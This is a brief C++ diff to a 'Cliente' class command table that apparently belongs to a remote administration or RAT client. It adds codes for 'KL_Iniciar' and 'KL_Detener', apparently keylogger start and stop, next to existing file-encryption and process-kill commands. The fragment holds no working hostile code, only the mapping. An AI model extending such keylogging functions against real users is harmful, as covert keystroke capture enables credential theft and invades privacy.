@@ -51,7 +51,9 @@ class Cliente {
 			{"524", EnumComandos::FM_Editar_Archivo_Guardar},
 			{"525", EnumComandos::FM_Crypt_Archivo},
 			{"526", EnumComandos::PM_Refrescar},
-			{"527", EnumComandos::PM_Kill}
+			{"527", EnumComandos::PM_Kill},
+			{"529", EnumComandos::KL_Iniciar},
+			{"530", EnumComandos::KL_Detener}
 
 		};
 
